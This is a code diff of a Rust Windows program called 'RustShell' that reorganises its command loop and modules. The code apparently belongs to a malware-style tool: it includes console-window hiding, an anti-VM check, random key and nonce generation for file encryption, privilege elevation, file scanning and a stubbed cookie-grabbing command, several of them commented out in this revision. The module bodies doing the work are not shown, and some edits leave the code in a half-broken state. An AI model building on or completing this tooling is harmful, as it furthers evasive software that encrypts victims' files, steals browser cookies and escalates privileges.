@@ -5,19 +5,25 @@ use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
 use winapi::um::wincon::SetConsoleTitleW;
 use colored::*;
-use std::{fs::{File, self}, path::{Path, PathBuf}};
+use std::{fs::{File}, path::{Path, PathBuf}};
 use rand::{rngs::OsRng, RngCore};
 use hex;
 use gethostname::gethostname;
 
-mod hide_window;
-mod functions;
-mod encrypt;
-mod antivm;
+mod functions {
+  pub mod encrypt;
+  pub mod antivm;
+  pub mod hide_window;
+  pub mod delete;
+  pub mod current_dir;
+  pub mod elevate;
+  pub mod file_scan;
+}
+use functions::{delete as del, encrypt as enc, antivm as avm, hide_window as hw, current_dir, elevate as elv, file_scan as fs};
 
 fn main() -> Result<(), anyhow::Error> {
   // hides the cmd window
-  // hide_window::hide_console_window();
+  // hw::hide_console_window();
 
   // Set the cmd window title
   let new_title = "RustShell";
@@ -30,7 +36,7 @@ fn main() -> Result<(), anyhow::Error> {
   };
 
   // Checks if the program is running in a VM
-  //antivm::antivm();
+  // avm::antivm();
 
   let mut key = [0u8; 32];
   let mut nonce = [0u8; 19];
@@ -41,10 +47,12 @@ fn main() -> Result<(), anyhow::Error> {
   let nonce = hex::encode(nonce);
 
   // Create the rustkeys folder if it doesn't exist
+  /*
   let folder_name = "rustkeys";
   if !Path::new(folder_name).exists() {
-    fs::create_dir(folder_name)?;
+    File::create(folder_name)?;
   }
+  
 
   let hostname = gethostname().into_string().unwrap();
 
@@ -81,7 +89,8 @@ fn main() -> Result<(), anyhow::Error> {
   writeln!(file, "{},{}", nonce_to_use, key_to_use)?;
 
   let key_to_use: [u8; 32] = hex::decode(key_to_use)?.try_into().unwrap();
-  let nonce_to_use: [u8; 19] = hex::decode(nonce_to_use)?.try_into().unwrap();
+  let nonce_to_use: [u8; 24] = hex::decode(nonce_to_use)?.try_into().unwrap();
+  */
 
   // Enable ANSI support for Windows 10
   ansi_term::enable_ansi_support().unwrap();
@@ -130,10 +139,10 @@ fn main() -> Result<(), anyhow::Error> {
         break;
       }
       "rm" | "del" => {
-        functions::remove();
+        del::remove();
       }
       "tree" => {
-        functions::tree()
+        //functions::tree()
       }
       "clear" | "cls" => {
         print!("{}[2J", 27 as char);
@@ -143,43 +152,43 @@ fn main() -> Result<(), anyhow::Error> {
         }
       }
       "find" => {
-        functions::find();
+        //functions::find();
       }
       "where" => {
-        functions::whereis();
+        current_dir::whereis();
       }
       "scan" => {
-        functions::scan();
+        fs::scan();
       }
       "cookies" => {
         //functions::cookies();
-      }
+      }/*
       "encrypt" | "enc" => {
-        encrypt::encrypt(
+        enc::encrypt(
           &key_to_use,
           &nonce_to_use,
         )?;
       }
       "decrypt" | "dec" => {
-        encrypt::decrypt(
+        enc::decrypt(
           &key_to_use,
           &nonce_to_use,
         )?;
-      }
+      }*/
       "help" => {
-        functions::help();
+        //functions::help();
       }
       "info" => {
-        functions::info();
+        //functions::info();
       }
       "kill" => {
-        functions::kill();
+        //functions::kill();
       }
       "disable" => {
-        functions::disable();
+        //functions::disable();
       }
       "elevate" => {
-        functions::elevate();
+        elv::elevate();
       }
       _ => {
         let mut parts = input.split_whitespace();
